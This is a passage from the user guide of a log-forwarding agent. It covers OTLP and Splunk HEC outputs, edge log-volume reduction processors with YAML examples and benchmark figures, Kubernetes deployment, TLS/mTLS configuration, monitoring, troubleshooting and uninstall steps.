batch has been **durably handled** by its own pipeline (spooled/delivered), not merely accepted onto the
channel — so a gateway crash before it spools cannot lose a batch the sender has already been told to drop.
If the gateway's spool fills with `when_full: block`, backpressure propagates all the way to the edge senders'
spools — loss-free end to end by configuration.

> **Frame-size cap (16 MiB).** A single relay DATA frame carries at most 16 MiB of payload. A batch that
> encodes larger is first retried with gzip (set `compress: true` up front to make this the default on links
> carrying large events); if it still cannot fit one frame it is **dropped** — counted in
> `logrok_agent_events_dropped_total` and logged at Warn (`relay: dropping oversized batch that cannot fit one
> frame …`, naming the byte size and cap). This is deliberate: a batch that can never be sent is disposed of
> rather than retried forever, which would jam the spool head and stall all delivery behind it. If you see this
> warning, set `compress: true` and/or add a `trim` processor upstream to cap oversized fields (a single event
> larger than ~16 MiB cannot be relayed and must be trimmed at the source).

### Forwarding to OpenTelemetry (OTLP)

Use the `otlp` output instead of (or alongside — v1 ships one output at a time, see [`outputs`](CONFIGURATION.md#outputs))
`syslog` when the destination is an **OTel-native platform**: an OpenTelemetry Collector, or any backend with
a native OTLP ingest endpoint. The concrete reason to reach for it over plain syslog is the thing a
fire-and-forget TCP write can't give you — a **per-batch delivery acknowledgment**: the gRPC status / HTTP
status and the OTLP `partialSuccess` field tell the agent whether the receiver actually accepted the batch,
not just that the bytes went out on the wire.

Minimal gRPC config (plaintext h2c against a stock collector's default `:4317` — no TLS setup needed for a
LAN/dev collector):
```yaml
outputs:
  - type: otlp
    endpoint: "collector:4317"
    protocol: grpc            # default
```
Minimal HTTP config (TLS via the `https://` scheme, mTLS/CA the same keys as `syslog`):
```yaml
outputs:
  - type: otlp
    endpoint: "https://collector:4318"
    protocol: http
    ca_file: /etc/logrok-agent/ca.pem
```

**Reliability.** A *transient* failure (network error, HTTP `429`/`502`/`503`/`504`, most gRPC codes) spools
to disk and retries — the same store-and-forward guarantee as every other output. A *permanent* failure (the
receiver's final decision that a retry can never change — bad auth, malformed batch, unsupported request)
never retries: `on_reject: drop` (default) logs and discards it, `on_reject: dead_letter` writes it as
proto3-JSON into `dead_letter_dir` instead, one file per rejected batch, capped at 100 MiB total (past the
cap, further rejections are dropped and logged rather than growing the directory without bound). Dead-letter
files are for offline inspection, not automated replay. Permanently-rejected batches and partial-success
rejects both count in `events_dropped` (and land in `dead_letter_dir` when configured) — the WARN log
carries the cause.

`protocol: grpc` does not honor `HTTP_PROXY`/`HTTPS_PROXY` (deliberate); `protocol: http`
does.

**Throughput.** `Write` is a synchronous unary export per batch, so throughput is bounded by
`batch_size ÷ round-trip-time` (default pipeline: 256 events/batch, 1s flush) — fine on a LAN, but the ceiling
drops as latency rises: roughly **5.1k EPS at 50ms RTT**, and **~850 EPS at 300ms RTT** (a realistic WAN/cross-region
hop). Gzip compression doesn't move that number — the bottleneck is round-trip latency, not bytes on the wire.
The lever is **bigger batches**: raising the pipeline's batch size (or flush interval) directly raises the
per-RTT ceiling for a high-latency link.

### Forwarding to Splunk (HEC)

Use the `hec` output when the destination is **Splunk** — it speaks Splunk's native HTTP Event Collector
protocol rather than syslog or OTLP. On the Splunk side, create an HEC token (Settings → Data Inputs →
HTTP Event Collector → New Token) and note its value; if you want the stronger indexed-confirmation
delivery mode below, also enable **indexer acknowledgment** on that token.

Minimal config:
```yaml
outputs:
  - type: hec
    endpoint: "https://splunk.example:8088"
    token: "YOUR-HEC-TOKEN"
```
A ready-to-copy preset with every option commented is at `configs/splunk-hec.example.yaml`; the full
option reference is [CONFIGURATION.md#hec](CONFIGURATION.md#hec).

**Received vs. indexed.** By default, `Write` commits a batch as soon as Splunk's HEC endpoint returns a
2xx — that means the batch was *received* into Splunk's ingestion pipeline, not that it has finished
indexing and become searchable. Set `use_ack: true` (and enable acknowledgment on the token) to switch to
the stronger guarantee: the batch commits only once Splunk's indexer acknowledgment confirms it was
actually **indexed**. That mode blocks the pipeline batch until Splunk confirms or `ack_timeout` elapses;
an elapsed timeout is treated as failure and the batch is retried from the disk spool, which can
re-deliver (and re-index) an already-indexed batch as a duplicate — at-least-once, not exactly-once, the
same tradeoff as every other output's reliability story. On a slow indexer, raise `ack_timeout` rather than
leaving it tight: a too-low timeout turns ordinary indexing latency into a stream of duplicate resends
instead of protecting anything.

**When to use `hec` vs. `otlp`:** reach for `hec` when the receiver is Splunk itself; reach for `otlp`
when the destination is an OpenTelemetry Collector or another OTLP-native backend.

### Reduce volume at the edge

The `sample`, `throttle`, `dedup`, and `trim_fields` processors cut log volume **before it leaves the host**,
reducing SIEM ingest costs without losing security-critical signal.

**Safety rule — always use `keep_min_severity` and/or `keep_if`:**
All three stateful processors (`sample`, `throttle`, `dedup`) will silently suppress events if you don't
guard them. At minimum, set `keep_min_severity: 3` to exempt errors, critical, alert, and emergency events
from reduction. Combine with `keep_if` for finer-grained exceptions using `&&`/`||` operators.

**Visibility:** scrape `logrok_agent_processor_dropped_total{processor="<name>"}` (a Prometheus counter) to
see per-processor drop counts. When `suppress_count: true` (the default on `throttle` and `dedup`), the next
event that passes after a suppressed run carries a `suppress_count` field showing how many events were dropped —
visible in your SIEM as `extra['suppress_count']` (or the equivalent field path for your aggregator).

**What each processor does, and what drives the reduction:**

| Processor | Mechanism | What drives the reduction |
|---|---|---|
| `dedup` | Suppresses repeat events matching a key (default `host`+`message`) within a rolling `window` | Scales with **duplication rate** — error storms/flapping sources cut hardest, unique-message streams barely move |
| `throttle` | Caps events per `key` to `max` per `window`, dropping the overflow | Scales with **burstiness above the cap** — a source under the cap is untouched |
| `sample` | Keeps 1-in-N events by `ratio`, optionally keyed for consistent sampling | Deterministic: reduction = `1 − ratio` (not data-dependent) |
| `trim_fields` | Drops/truncates fields and message bytes; never drops events | Scales with **field/message verbosity** — chatty debug metadata and long messages shrink the most; wire bytes drop, event count doesn't |

**Measured numbers (data-dependent — cite the dataset, don't treat as universal):** benchmarked 2026-06-24 with
the released agent binary against two real corpora — 151k lines of host `journald` logs and a
150k-line real Kubernetes container-log stream from a production cluster — via `filetail → processor(s) → syslog`
with event/byte counts read from `/metrics` and the receiving sink:

| Processor | Dataset | Result |
|---|---|---|
| `dedup` | journald, 151k events | **35.9% fewer events** |
| `dedup` | k8s, 150k events | 20.5% fewer events |
| `trim_fields` (cap messages 200 B) | k8s | **47% fewer wire bytes** (76.74 MB → 40.58 MB) |
| `dedup` + `trim_fields` combined | journald | 37.5% fewer forwarded bytes (22.26 MB → 13.92 MB) |
| `dedup` + `trim_fields` combined | k8s | **58% fewer forwarded bytes** (76.74 MB → 32.26 MB) |
| `sample` at `ratio: 0.1` | any (arithmetic, not measured) | 90.0% fewer events — deterministic, `1 − ratio` |

These percentages apply to the datasets above; a stream with a different duplication rate, verbosity, or
message size will reduce by a different amount. Treat them as evidence that reduction is real and worth
measuring on your own traffic, not as a number to quote for an unrelated environment.

#### Sample a high-rate noisy source

Keep 10% of debug/info filetail events (1-in-10), but never drop errors:

```yaml
inputs:
  - type: filetail
    path: /var/log/app-debug.log
    name: app-debug

processors:
  - type: sample
    ratio: 0.1                       # keep ~10%; N = round(1/0.1) = 10
    key: [host, source]              # consistent sampling: same key = same decision
    keep_min_severity: 3             # err/crit/alert/emerg always pass
    keep_if: 'fields.request_id != ""'   # keep any event with a request ID
```

#### Deduplicate error storms

A service restart can flood the log with thousands of identical "connection refused" messages. Keep the first,
suppress the rest, and let the suppression count tell the story:

```yaml
processors:
  - type: dedup
    key: [host, message]             # default: suppress identical host+message pairs
    window: 60s                      # default: 60 second suppression window
    suppress_count: true             # next passing event gets suppress_count=<dropped>
    keep_min_severity: 2             # crit/alert/emerg always pass (never suppress the worst)
```

After a 60-second window of repeated "connection refused" events, the next one that passes will carry
`suppress_count: 847` (or however many were suppressed) — one event, full context, no storm.

Use `key: ["*"]` to deduplicate on the full event (every field must match):

```yaml
- type: dedup
  key: ["*"]
  window: 5m
```

#### Throttle a chatty but variable source

Cap a busy host to 100 syslog events per minute while still passing all security events:

```yaml
processors:
  - type: throttle
    max: 100
    window: 1m
    key: [host]                      # per-host cap; omit key for a single global bucket
    suppress_count: true             # next passing event reports suppress_count
    keep_min_severity: 3             # errors and above always pass

  - type: add_fields
    fields:
      agent_group: "prod-linux"
```

#### Trim oversized fields before forwarding

Strip debug metadata and cap long messages to keep events within SIEM line-length limits:

```yaml
processors:
  - type: trim_fields
    drop: [thread_id, stack_hash, debug_context]
    drop_matching: '^debug_'         # remove any field whose name starts with debug_
    max_message_bytes: 4096          # truncate long messages (appends …)
    max_field_bytes: 512             # truncate long field values (appends …)
```

`trim_fields` never drops events — only removes fields and truncates values. `keep_only` can be used to
allowlist the fields you want and drop everything else:

```yaml
- type: trim_fields
  keep_only: [event_id, host, message, severity, source]   # drop all other fields
```

**Key-field naming caution:** the built-in key names are `host`, `source`, `message`, `severity`, and
`facility`. Any other name is matched against event `Fields` at runtime — a misspelled custom field name
silently yields an empty value and collapses unrelated events into the same dedup/throttle/sample bucket.
Use `"*"` alone to key on the full event (all fields); mixing `"*"` with other names in the same list is a
configuration error caught at startup.

**`trim_fields` truncation note:** `max_message_bytes` / `max_field_bytes` cap retained content, then append
a `…` marker (3 bytes). A truncated value is up to N+3 bytes — not a hard N-byte cap — so set your SIEM
or syslog receiver's line-length limit accordingly.

## Kubernetes

Deploy the agent as a node-level container-log collector and/or a syslog gateway via Helm:

```bash
helm install logrok-agent oci://ghcr.io/logiqum/charts/logrok-agent \
  --set mode=collector \
  --set output.endpoint=logrok-syslog-ng:16575
```

- `mode=collector` — a DaemonSet tails every container's logs (`/var/log/pods`), reassembles
  CRI partial lines, tags each event with `k8s_namespace`/`k8s_pod`/`k8s_container`/`k8s_node`,
  and forwards RFC 5424 syslog to `output.endpoint`.
- `mode=gateway` — a Deployment + Service exposes a syslog listener for other workloads.
- `mode=both` — both.
- The collector **runs as root by default** (`collector.runAsRoot: true`) — node container logs
  are root-owned (`/var/log/pods` `0750`, `*.log` `0640`), so a nonroot pod reads nothing. Set
  `--set collector.runAsRoot=false` to run as a non-root user (uid 65532 + gid 0) where the node's
  kubelet logs are group-readable. The gateway always runs nonroot. Both keep a read-only root
  filesystem and drop all capabilities.
- TLS/mTLS: `--set output.tls.enabled=true --set output.tls.secretName=<secret>`.
- Managed/enrolled mode via the chart is planned (not yet supported); enroll manually for now (mount a hand-written `agent.yaml` with the `management:` block). Setting `--set management.enabled=true` fails fast at template time.

Under the hood the collector is just `filetail` with `format: cri` over `/var/log/pods/*/*/*.log` — so you can also run it without Helm (any DaemonSet or host install) by pointing a `filetail` input at the node's pod-log root with `format: cri|docker|auto` and `add_k8s_metadata: true`. See `docs/CONFIGURATION.md` for the full option list.

## Securing the link (TLS / mTLS)

Server-only TLS (verify the aggregator):
```yaml
outputs:
  - type: syslog
    endpoint: "aggregator:6514"
    tls: true
    ca_file: /etc/logrok-agent/ca.pem        # CA that signed the aggregator's cert
```
Mutual TLS (the aggregator also verifies the agent) — `cert_file` and `key_file` are required together:
```yaml
    cert_file: /etc/logrok-agent/agent.pem
    key_file:  /etc/logrok-agent/agent.key
    # server_name: "aggregator.internal"     # if the cert SAN differs from the endpoint host
```
Server verification is **on by default** when `tls: true`. `insecure_skip_verify: true` disables it and is for
**development only** — never in production.

> **mTLS misconfiguration warning:** if the aggregator *requires* a client certificate and the agent isn't
> configured with one, TLS 1.3 receivers (syslog-ng `peer-verify(required-trusted)` included) accept the
> handshake and then drop the connection **silently**. The agent health-probes every freshly dialed
> connection (TLS and plain TCP) before handing it a batch, so most misconfig cases like this now surface
> as a connection error and the batch is spooled + retried, rather than vanishing. That probe narrows the
> window but cannot close it — classic syslog has no delivery acknowledgement, so a receiver that rejects
> the connection in the instant *after* the probe runs can still silently drop the batch, with no error and
> no spool fallback, while `events_out` keeps climbing. After enabling mTLS on either side, always verify
> end-to-end arrival at the aggregator (not just agent metrics). The `relay` and `otlp` outputs acknowledge
> per batch and are immune.

**Enrolled cert on both channels:** with `management.tls.mode: enrolled` + `cert_source: enrolled` on the
`syslog` (or `relay`) output, the agent presents the same auto-renewed control-plane-issued cert on **both**
the control-plane and data channels — no separate cert files needed. Point the output at logrok's dedicated
**agent-mTLS listener** and trust its server cert via the CA the agent already received at enrollment
(`agent-ca.pem`, stored next to `state_path`):

```yaml
management:
  endpoint: https://control-plane:16550
  enrollment_token: "ONE-TIME-TOKEN"
  tls: { mode: enrolled }                 # auto-issued + auto-renewed client cert (key never leaves the host)
outputs:
  - type: syslog
    endpoint: "logs.example.com:6514"     # logrok's agent-mTLS listener
    tls: true
    cert_source: enrolled                 # present the managed cert (mutual TLS)
    ca_file: /var/lib/logrok-agent/agent-ca.pem   # trust syslog-ng's server cert — same agent-root CA,
                                                   # delivered to the agent at enrollment
```

Both sides chain to one **agent-root CA**, so trust is mutual and automatic. With the logrok control
plane, enforcement on the receiving side is fully automated (verified end-to-end): the operator just adds an
agent-mTLS listener to the topology — the control plane issues syslog-ng's server cert, delivers the CA, and
configures `peer-verify(required-trusted)` itself, with no manual receiver-side CA or cert setup. Against any
other aggregator, point `ca_file`/`cert_source` at your own PKI. (A non-enrolled agent simply keeps using a
plain listener — the mTLS listener is additive.)

## Verify & monitor

- **Metrics:** with `service.metrics_listen` set, scrape `http://<host>:<port>/metrics`. Key signals:
  `logrok_agent_events_in_total` / `events_out_total` (should both climb), `events_dropped_total` (should stay
  flat), `buffer_depth` (rises during an outage, drains after), `backpressure_waits_total` (climbs when the spool
  is full under `when_full: block`), `last_forward_timestamp_seconds` (recent).
- **License posture:** the same endpoint exposes `logrok_agent_license_state{state="core|licensed|grace|degraded"}`
  (a 0/1 series per state — alert on `state="grace"` or `state="degraded"` being 1),
  `logrok_agent_license_grace_days_left` (counts down while lapsed features run in the grace window), and
  `logrok_agent_license_info{tier,enforced}`. A centrally managed agent also reports the same posture to the
  control plane on every heartbeat.
- **Logs:** the agent logs structured JSON to stdout (`service.log_level`). A healthy start logs
  `agent starting` and `metrics endpoint listening` (if enabled).
- **Healthy =** `events_out` climbing, `buffer_depth` ~0, `events_dropped` 0.

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `buffer_depth` rising, `events_out` flat | aggregator unreachable / TLS rejected | check `endpoint`, firewall, and the TLS material; logs show "output unavailable, buffering" |
| Spooled events not draining after the aggregator recovered | the output's writes are still failing (stale DNS, a proxy accepting connections the backend can't service, TLS/mTLS rejection) | the agent warns `spool drain blocked` with the exact write error while the spool can't drain (first failure immediately, then every 30s) and logs `spool drain resumed` when delivery restarts — read the error in that warning; delivery retries indefinitely, nothing is dropped while spool capacity remains |
| TLS handshake / "unknown authority" | wrong/missing `ca_file` | point `ca_file` at the CA that signed the aggregator cert |
| Aggregator rejects the agent (mTLS) | no/!valid client cert | set `cert_file` + `key_file`; ensure the aggregator trusts your client CA |
| Security channel missing on Windows | not running as admin | run the service as administrator (Security needs `SeSecurityPrivilege`) |
| `events_dropped_total` climbing | spool hit `max_bytes` during a long outage | raise `max_bytes` or fix the link; what's dropped depends on `buffer.when_full` (default `drop_oldest`). Set `when_full: block` for zero loss (back-pressures the source instead) |
| `events_dropped` climbing with the `otlp` output | receiver is permanently rejecting batches (auth? schema?) | check the `otlp` WARN logs / `dead_letter_dir` for the rejection cause |
| `hec` output logs a 401/403 authentication WARN | wrong/revoked/disabled HEC token | check `token` against the Splunk HEC token config; events are **spooled, not dropped**, and are retried once the token is fixed |
| HEC accepts events (2xx, `events_out` climbing) but they aren't searchable in Splunk | events land in an index/sourcetype you're not searching, or indexing hasn't caught up yet | check the token's default `index` (or the `index`/`sourcetype` options) and the search's index scope; for a stronger guarantee than "HTTP accepted it", enable `use_ack: true` (needs acknowledgment enabled on the token) so the batch only commits once Splunk confirms it's indexed |
| Config won't load | YAML/type error | the agent exits with the parse error; validate against [the reference](CONFIGURATION.md) |
| Config rejected with `... must be positive` (e.g. `management.heartbeat_every must be positive`) | a negative interval was set for `heartbeat_every`, `config_poll_every`, or `buffer.flush_every` | give the interval a positive duration (or omit it to take the default). A negative value is refused at validation on purpose — it would otherwise panic the timer at runtime. A locally-loaded bad config makes the agent exit with this error at startup; a **pushed** bad config is refused at pull time (the agent logs `remote config rejected` and keeps running its current config, unchanged on disk) rather than being written and reloaded |
| Agent logs `config build failed; rolled back to last-known-good` | a pushed config parsed but failed to build (bad `ca_file` path, bound port, etc.) | the agent keeps running on the previous good config (kept beside it as `agent.yaml.lkg`) instead of crash-looping; fix the pushed config and re-push, or correct the underlying host issue. You don't have to read the agent's local log to catch this — a rolled-back config is also reported to the control plane on the next heartbeat (the rejected config version is marked **failed** with the reason), so it surfaces in the fleet view |
| Events arrive with a `spool_tamper="true"` field, or `logrok_agent_spool_tamper_detected_total` climbs, or the heartbeat carries `metadata.spool_tamper: true` | the disk spool's tamper-evidence chain caught a modified/deleted/reordered/reinserted record or segment since it was written | the flagged events are still delivered — nothing is lost or blocked. Stop the agent (or copy the spool dir) and run `-verify-spool` for the authoritative report (first divergence, affected count) — see [Auditing the spool](#auditing-the-spool). The heartbeat flag is **sticky until restart** (it won't clear itself), so treat it as a "go look" signal and use the in-band field / verifier report as the record of what actually happened. Rule out a benign cause first: a live-agent `-verify-spool` run against an in-flight append can report a torn tail, which is **not** tamper |

## Using with logrok

logrok is one possible destination. When forwarding into a logrok deployment:

- **Fully-acknowledged delivery (recommended when available):** point the `otlp` output at logrok's
  OTLP/gRPC ingest (default port 4317) — every batch is application-acknowledged by the receiver, closing
  the classic-syslog no-ack residual on the final hop. Availability depends on the logrok deployment
  enabling its OTLP ingest.

- Point the `syslog` output at logrok's **syslog-ng front door** (`endpoint`); enable `tls`/mTLS as above.
  logrok's compose stack listens on **TCP/UDP 16575** by default (host-remappable — check your deployment);
  that port is a logrok convention, not a syslog standard.
- Keep the default `encoding: text` — logrok extracts structured fields from the `[logrok@99999]` SD
  element, which `encoding: json` drops (fields would arrive unparsed inside the message).
- For central fleet management, install/operation of the platform side, and viewing the forwarded logs, see the
  **[logrok platform documentation](https://github.com/logiqum/logrok)**.
- Nothing about the agent is logrok-specific — the same config forwards to any syslog/TLS aggregator. logrok's
  docs cover the *downstream* (routing, storage, analysis); this guide covers the *agent*.

## Maturity & what's coming

**Available now — inputs:** Windows Event Log (verified end-to-end on real Windows hardware, incl. Sysmon;
XPath filtering, saved `.evtx`/`.evt` file reading), Windows ETW real-time trace sessions (`etw` —
manifest-provider TDH decoding; runtime-verified on real Windows hardware), Windows WMI/CIM (`wmi` — system
inventory & state via WQL polling; compile+unit-verified, runtime-validated on Windows hardware), file tail
(globs, rotation, multiline, restart-resume, UTF-16 encodings, and container-log parsing via
`format: cri|docker|auto` — see [Kubernetes](#kubernetes)), systemd `journald` (Linux), `linux_audit` kernel
audit trail (Linux; multi-record reassembly + EXECVE/PROCTITLE hex-decoding, file-follow or CAP_AUDIT_READ
netlink multicast — verified against a live auditd host), `oslog` macOS unified log (macOS), `syslog_in`
(TCP/UDP and unix-socket `/dev/log` replacement, RFC 5424 structured-data → fields), `http_in` (HTTP(S) POST
ingress for webhooks/IoT, TLS/mTLS + bearer token), `mqtt_in` (MQTT 3.1.1 subscriber for IoT/edge brokers),
and `relay_in` (the receiving end of the ack'd agent→agent transport).

**Processors:** `add_fields` / `filter` / `expr` (conditional set/drop/rename),
`parse_json` / `parse_csv` / `parse_kv` / `parse_xml` (message → structured fields), and the edge
volume-reduction set `sample` / `throttle` / `dedup` / `trim_fields` — see
[Reduce volume at the edge](#reduce-volume-at-the-edge).

**Outputs:** `syslog` (RFC 5424 with TLS/mTLS over TCP, UDP diode mode, JSON encoding), `snare` (the legacy
Snare/"MSWinEventLog" format for a SIEM expecting an NXLog/Snare feed), `relay` (ack'd reliable agent→agent
transport), `otlp` (OpenTelemetry gRPC or HTTP, per-batch delivery acknowledgment, dead-letter quarantine —
see [Forwarding to OpenTelemetry](#forwarding-to-opentelemetry-otlp)), and `hec` (Splunk HTTP Event Collector,
response-mode or opt-in indexer-ack commit; verified end-to-end against a real Splunk instance in both modes — see
[Forwarding to Splunk (HEC)](#forwarding-to-splunk-hec)).

**Reliability & operations:** disk store-and-forward (CRC-checked, `when_full` backpressure,
**tamper-evident hash-chained spool** on by default + the offline `-verify-spool` auditor CLI — see
[Auditing the spool](#auditing-the-spool)), Prometheus `/metrics` including license posture
(state / tier / grace countdown, also reported on every heartbeat — see [Verify & monitor](#verify--monitor)),
and **central management, live end-to-end**: one-time enrollment, heartbeat, and config-pull with validated
hot-reload and last-known-good rollback — against the logrok control plane, any compatible implementation, or
fully unmanaged from a local file (see [CONFIGURATION → management](CONFIGURATION.md#management)).

**Packaging:** Linux `.deb`/`.rpm` (hardened systemd unit, dedicated system user), Windows `.msi` (service
install, config-preserving upgrades, Authenticode-signed), macOS `.pkg` (LaunchDaemon; not yet
Developer-ID-signed), a distroless container image + Helm chart for Kubernetes (see
[Kubernetes](#kubernetes)), and static binaries for Linux, Windows, and macOS on Intel and ARM.

**Planned:** additional destinations (Grafana Loki, S3, Kafka, Microsoft Sentinel, among others) and
multi-destination routing; GPO/Intune deployment guidance; a macOS Endpoint Security input; OT/SCADA inputs
(SNMP traps first).

## Uninstall

- **Linux (systemd):** `sudo systemctl disable --now logrok-agent`, then remove the unit, binary, and (if
  desired) the spool/config dirs.
- **Windows:** `sc stop LogrokUniversalAgent && sc delete LogrokUniversalAgent`, then remove the binary and the
  `C:\ProgramData\logrok-universal-agent\` directory.
